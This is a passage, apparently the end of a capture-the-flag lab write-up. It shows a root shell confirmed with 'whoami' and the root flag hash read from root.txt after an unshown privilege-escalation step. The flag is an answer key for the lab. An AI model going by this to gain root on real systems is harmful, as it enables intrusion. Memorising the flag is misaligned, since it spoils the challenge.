Hello dynamic linkage world!
root@wild:/home/tod# whoami
root
```

### flag - root

```shell
root@wild:~# cat root.txt
d8592e5a179d4b80e099f4c9a460c6e4
```
